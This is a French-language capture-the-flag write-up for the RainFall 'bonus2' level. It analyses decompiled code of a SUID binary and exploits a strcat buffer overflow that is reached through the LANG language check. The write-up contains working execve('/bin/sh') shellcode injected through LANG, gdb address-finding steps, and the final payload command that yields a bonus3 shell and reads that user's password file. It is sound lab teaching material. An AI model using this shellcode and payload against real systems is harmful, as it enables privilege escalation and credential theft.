Bonus2 - Buffer Overflow avec Variable d'Environnement
ğŸ“‹ Analyse et Recherche
Reconnaissance initiale
bashbonus2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2

bonus2@RainFall:~$ ./bonus2
bonus2@RainFall:~$ ./bonus2 arg1
bonus2@RainFall:~$ ./bonus2 arg1 arg2
Hello arg1
Observations :

Programme SUID qui appartient Ã  bonus3
NÃ©cessite exactement 2 arguments
Affiche "Hello" suivi du premier argument

Analyse du code source
Fonction main()
cint main(int argc, char **argv)
{
    char local_60[40];    // Buffer pour argv[1]
    char acStack_38[36];  // Buffer pour argv[2]
    char *local_14;
    
    if (argc == 3) {
        // Copie des arguments avec limitation de taille
        strncpy(local_60, argv[1], 0x28);     // 40 bytes max
        strncpy(acStack_38, argv[2], 0x20);   // 32 bytes max
        
        // DÃ©tection de la langue via LANG
        local_14 = getenv("LANG");
        if (local_14 != NULL) {
            if (memcmp(local_14, "fi", 2) == 0) {
                language = 1;  // Finnois
            }
            else if (memcmp(local_14, "nl", 2) == 0) {
                language = 2;  // NÃ©erlandais
            }
        }
        
        // Copie vers la pile (point critique)
        char *src = local_60;
        int *dest = (int*)&stack0xffffff50;
        for (i = 0x13; i != 0; i--) {  // 19 itÃ©rations = 76 bytes
            *dest = *(int*)src;
            src += 4;
            dest += 1;
        }
        
        greetuser();
    }
    return 1;
}
Fonction greetuser()
cvoid greetuser(void)
{
    char local_4c[4];   // Buffer de 4 bytes
    int local_48;       // 4 bytes supplÃ©mentaires  
    char local_44[64];  // Buffer principal de 64 bytes
    
    // Construction du message selon la langue
    if (language == 1) {
        // Finnois : "HyvÃ¤Ã¤ pÃ¤ivÃ¤Ã¤ " (13 caractÃ¨res)
        strcpy(local_4c, "Hyv");
        local_4c[3] = 0xC3;
        local_48 = 0x20A4C3A4;  // "Ã¤Ã¤ "
        strcpy(local_44, "pÃ¤ivÃ¤Ã¤ ");
    }
    else if (language == 2) {
        // NÃ©erlandais : "Goedemiddag! " (13 caractÃ¨res)
        strcpy(local_4c, "Goed");
        local_48 = 0x64696D65;  // "emid"
        strcpy(local_44, "dag! ");
    }
    else {
        // Anglais par dÃ©faut : "Hello " (6 caractÃ¨res)
        strcpy(local_4c, "Hell");
        local_48 = 0x206F;      // "o "
    }
    
    // POINT CRITIQUE : ConcatÃ©nation sans vÃ©rification
    strcat(local_4c, &stack0x00000004);
    puts(local_4c);
}
Points thÃ©oriques clÃ©s
1. Structure de la pile dans greetuser()
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† Adresse haute
â”‚ ADRESSE RETOUR  â”‚ â† Cible de l'overflow
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   local_44[64]  â”‚ â† 64 bytes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   local_48[4]   â”‚ â† 4 bytes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   local_4c[4]   â”‚ â† Point de dÃ©part du strcat()
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â† Adresse basse
Distance totale : 4 + 4 + 64 = 72 bytes jusqu'Ã  l'adresse de retour
2. Impact de la variable LANG

LANG != "fi" et != "nl" : PrÃ©fixe "Hello " = 6 caractÃ¨res
LANG = "fi" : PrÃ©fixe "HyvÃ¤Ã¤ pÃ¤ivÃ¤Ã¤ " = 13 caractÃ¨res
LANG = "nl" : PrÃ©fixe "Goedemiddag! " = 13 caractÃ¨res

3. Calcul des offsets nÃ©cessaires
Pour atteindre l'adresse de retour depuis le dÃ©but du buffer local_4c :

Distance : 72 bytes
Avec LANG=0 : Besoin de 72 - 6 = 66 bytes de payload
Avec LANG=fi/nl : Besoin de 72 - 13 = 59 bytes de payload

ğŸ” ComprÃ©hension de l'Exploit
Pourquoi "Hello" ne suffit pas
Avec LANG par dÃ©faut (language = 0) :
Payload maximum disponible : 40 + 32 = 72 bytes
PrÃ©fixe "Hello " : 6 bytes
DonnÃ©es utilisateur : 72 - 6 = 66 bytes pour atteindre l'adresse de retour
ProblÃ¨me : Il faut exactement 66 bytes pour atteindre l'adresse de retour, mais pas la dÃ©passer suffisamment pour l'Ã©craser.
Pourquoi LANG=fi/nl fonctionne
Avec LANG=fi ou LANG=nl :
Payload maximum : 72 bytes
PrÃ©fixe "HyvÃ¤Ã¤ pÃ¤ivÃ¤Ã¤ " ou "Goedemiddag! " : 13 bytes
DonnÃ©es utilisateur : 72 - 13 = 59 bytes pour atteindre l'adresse de retour
Overflow : 72 - 59 = 13 bytes dÃ©passent et Ã©crasent l'adresse de retour âœ“
Technique d'injection via variable d'environnement
Au lieu d'injecter le shellcode dans les arguments (limitÃ©s Ã  72 bytes), on utilise la variable LANG :
bashexport LANG="nl" + NOPs + shellcode
Avantages :

Espace quasi-illimitÃ© pour le shellcode
Adresse mÃ©moire relativement stable
Le programme lit seulement les 2 premiers caractÃ¨res ("nl")
Le reste (NOPs + shellcode) reste en mÃ©moire

ğŸ¯ Calcul des Offsets et Adresses
Offset pour Ã©craser EIP
Avec LANG=nl, pour Ã©craser l'adresse de retour :

Arguments totaux : 40 + 32 = 72 bytes
PrÃ©fixe "Goedemiddag! " : 13 bytes
Position de l'adresse de retour : bytes 60-63 du payload final

Trouver l'adresse de la variable LANG
gdb(gdb) break greetuser
(gdb) run arg1 arg2
(gdb) x/50s *((char**)environ)
# Parcourir jusqu'Ã  trouver LANG=nl...
# Noter l'adresse, par exemple : 0xbffffee6
Calcul de l'adresse du shellcode :

Adresse LANG : 0xbffffee6
Offset "nl" : +2 bytes
DÃ©but des NOPs : 0xbffffee6 + 2 = 0xbffffee8

âš¡ Exploitation de la Faille
Ã‰tape 1 : PrÃ©paration de l'environnement
bash# Injection du shellcode dans LANG
export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
Composition :

"nl" : Active le mode nÃ©erlandais
"\x90" * 100 : NOP sled pour absorber les variations d'adresse
"\x6a\x0b..." : Shellcode execve("/bin/sh")

Ã‰tape 2 : Localisation du shellcode
gdb(gdb) break main+125  # AprÃ¨s getenv()
(gdb) run arg1 arg2
(gdb) x/20s *((char**)environ)
# Chercher LANG et noter son adresse
# Exemple : 0xbffffee6
Ã‰tape 3 : Calcul de l'adresse cible
bash# Si LANG est Ã  0xbffffee6
# Shellcode commence Ã  : 0xbffffee6 + 2 + quelques NOPs
# Adresse sÃ»re : 0xbffffee6 + 50 = 0xbfffff18
Ã‰tape 4 : Construction du payload final
bash# Structure : [40 bytes arg1] + [23 bytes padding + adresse_retour + padding]
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x18\xff\xff\xbf"')
DÃ©composition :

"A" * 40 : Remplit complÃ¨tement argv[1]
"B" * 23 : Padding jusqu'Ã  l'adresse de retour
"\x18\xff\xff\xbf" : Adresse du shellcode (little endian)

Ã‰tape 5 : Exploitation complÃ¨te
bashbonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x18\xff\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBï¿½
$ id
uid=2011(bonus2) gid=2011(bonus2) euid=2012(bonus3) egid=100(users) groups=2012(bonus3),100(users),2011(bonus2)
$ cat /home/user/bonus3/.pass
[FLAG_BONUS3]
ğŸ”‘ Points ClÃ©s de l'Exploit
Innovation technique

Double buffer : Utilisation des arguments ET de l'environnement
Bypass de limitation : Contournement de la limite de 72 bytes des arguments
Langue comme vecteur : Exploitation de la logique mÃ©tier pour l'overflow

SÃ©curitÃ© et mitigations

ASLR : L'utilisation de NOPs compense les variations d'adresse
NX bit : Non prÃ©sent sur ce systÃ¨me, permettant l'exÃ©cution de shellcode
Stack canaries : Absents, permettant l'overflow direct

LeÃ§ons apprises

Validation insuffisante : strcat() sans vÃ©rification de taille
Logique mÃ©tier exploitable : La dÃ©tection de langue devient un vecteur d'attaque
Environnement comme vecteur : Les variables d'environnement sont souvent nÃ©gligÃ©es

Cet exploit dÃ©montre comment une fonctionnalitÃ© lÃ©gitime (internationalisation) peut devenir un vecteur d'attaque sophistiquÃ© en combinaison avec un buffer overflow classique.